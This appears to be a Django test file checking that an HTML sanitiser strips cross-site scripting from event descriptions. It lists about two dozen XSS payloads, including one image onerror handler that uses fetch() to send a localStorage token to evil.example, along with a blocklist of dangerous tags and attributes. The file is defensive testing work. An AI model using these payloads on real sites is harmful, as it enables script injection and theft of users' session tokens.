"""Event descriptions: scripts, event handlers and unsafe links never reach a page; real formatting survives."""
import datetime
import importlib

from django.apps import apps as django_apps
from django.contrib.auth import get_user_model
from django.test import SimpleTestCase, TestCase
from rest_framework.test import APIClient

from .html_clean import clean_html
from .models import Event, UserProfile

User = get_user_model()

ATTACKS = [
    '<script>alert(1)</script>',
    '<img src=x onerror="fetch(\'https://evil.example/?t=\'+localStorage.token)">',
    '<a href="javascript:alert(1)">click</a>',
    '<a href="  JaVaScRiPt:alert(1)">click</a>',
    '<a href="jav&#x09;ascript:alert(1)">click</a>',
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
    '<a href="vbscript:msgbox(1)">click</a>',
    '<iframe src="https://evil.example"></iframe>',
    '<svg onload=alert(1)></svg>',
    '<svg><script>alert(1)</script></svg>',
    '<p onclick="steal()">hello</p>',
    '<body onload=alert(1)>',
    '<style>body{display:none}</style>',
    '<form action="//evil.example"><input name=pw></form>',
    '<object data="//evil.example/x.swf"></object>',
    '<embed src="//evil.example/x.swf">',
    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    '<base href="//evil.example/">',
    '<link rel="stylesheet" href="//evil.example/x.css">',
    '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<<script>script>alert(1)<</script>/script>',
    '<img src="x" onerror=alert(1)//',
    '<details open ontoggle=alert(1)>',
]
FORBIDDEN = ['<script', 'onerror', 'onload', 'onclick', 'ontoggle', 'javascript:', 'vbscript:', 'data:text', '<iframe',
             '<svg', '<style', '<form', '<object', '<embed', '<meta', '<base', '<link', '<img', '<input', '<details', '<math']


class CleanHtmlTests(SimpleTestCase):
    def test_every_attack_is_defused(self):
        for attack in ATTACKS:
            out = clean_html(f'<p>before</p>{attack}<p>after</p>').lower()
            for bad in FORBIDDEN:
                self.assertNotIn(bad, out, f'{bad!r} survived in {attack!r} -> {out!r}')

    def test_cleaning_twice_changes_nothing(self):
        for attack in ATTACKS:
            once = clean_html(attack)
            self.assertEqual(clean_html(once), once, attack)

    def test_the_formatting_the_editor_makes_is_kept(self):
        html = ('<h2>Agenda</h2><p>Come <strong>early</strong>, <em>hear</em> <s>old</s> news and '
                '<a href="https://example.com/x?a=1&amp;b=2">the plan</a>.</p><ul><li>One</li><li>Two</li></ul>'
                '<ol><li>First</li></ol><blockquote>Quote</blockquote><pre><code>x = 1</code></pre><h3>Details</h3><hr><p>a<br>b</p>')
        out = clean_html(html)
        for keep in ('<h2>Agenda</h2>', '<strong>early</strong>', '<em>hear</em>', '<ul><li>One</li>', '<ol><li>First</li></ol>',
                     '<blockquote>Quote</blockquote>', '<pre><code>x = 1</code></pre>', '<h3>Details</h3>', 'href="https://example.com/x?a=1&amp;b=2"'):
            self.assertIn(keep, out)

    def test_links_open_safely_and_mail_and_phone_links_work(self):
        out = clean_html('<a href="https://example.com">a</a><a href="mailto:hi@example.com">b</a><a href="tel:+2348012345678">c</a>')
        self.assertIn('rel="noopener noreferrer nofollow"', out)
        self.assertIn('target="_blank"', out)
        self.assertIn('href="mailto:hi@example.com"', out)
        self.assertIn('href="tel:+2348012345678"', out)

    def test_a_link_cannot_carry_its_own_target_or_rel(self):
        out = clean_html('<a href="https://example.com" target="_self" rel="opener" onclick="x()">a</a>')
        self.assertNotIn('opener"', out.replace('noopener', ''))
        self.assertNotIn('onclick', out)

    def test_plain_text_and_empty_values(self):
        self.assertEqual(clean_html('Just words & more'), 'Just words &amp; more')
        self.assertEqual(clean_html(''), '')
        self.assertEqual(clean_html(None), '')


class EventDescriptionTests(TestCase):
    PAYLOAD = '<p>Hi</p><img src=x onerror="steal(localStorage.token)"><script>alert(1)</script><a href="javascript:alert(1)">go</a>'

    def setUp(self):
        self.user = User.objects.create_user(email='org@example.com', workos_id='u_org')
        UserProfile.objects.filter(user=self.user).update(handle='org', display_name='Org', is_public=True)
        self.client = APIClient()
        self.client.force_authenticate(self.user)

    def body(self, **kw):
        d = dict(name='Meetup', day=str(datetime.date.today() + datetime.timedelta(days=9)), time_from='18:00', time_to='20:00',
                 location='Lagos', description=self.PAYLOAD, ticket_price='0', capacity=50, category='entertainment')
        d.update(kw)
        return d

    def assert_clean(self, text):
        for bad in ('<script', 'onerror', 'javascript:', '<img'):
            self.assertNotIn(bad, text.lower())
        self.assertIn('<p>Hi</p>', text)

    def test_creating_an_event_stores_and_returns_clean_html(self):
        r = self.client.post('/api/events/', self.body(), format='json')
        self.assertEqual(r.status_code, 201)
        self.assert_clean(r.json()['description'])
        event = Event.objects.get(slug=r.json()['slug'])
        self.assert_clean(event.description)

    def test_editing_an_event_cleans_the_new_description(self):
        slug = self.client.post('/api/events/', self.body(description='<p>Hi</p>'), format='json').json()['slug']
        r = self.client.patch(f'/api/events/{slug}/', {'description': self.PAYLOAD}, format='json')
        self.assertEqual(r.status_code, 200)
        self.assert_clean(Event.objects.get(slug=slug).description)

    def test_visitors_get_clean_html_even_if_the_database_holds_a_script(self):
        slug = self.client.post('/api/events/', self.body(description='<p>Hi</p>'), format='json').json()['slug']
        Event.objects.filter(slug=slug).update(description=self.PAYLOAD)   # a bulk update skips save()
        anon = APIClient().get(f'/api/events/{slug}/')
        self.assertEqual(anon.status_code, 200)
        self.assert_clean(anon.json()['description'])

    def test_the_migration_cleans_events_that_were_saved_before(self):
        event = Event.objects.get(slug=self.client.post('/api/events/', self.body(description='<p>Hi</p>'), format='json').json()['slug'])
        Event.objects.filter(pk=event.pk).update(description=self.PAYLOAD)
        migration = importlib.import_module('bryo.migrations.0083_clean_event_descriptions')
        migration.clean_descriptions(django_apps, None)
        event.refresh_from_db()
        self.assert_clean(event.description)

    def test_a_normal_description_is_untouched(self):
        good = '<h2>Agenda</h2><p>Come <strong>early</strong>.</p><ul><li>One</li></ul>'
        r = self.client.post('/api/events/', self.body(description=good), format='json')
        self.assertEqual(r.json()['description'], good)
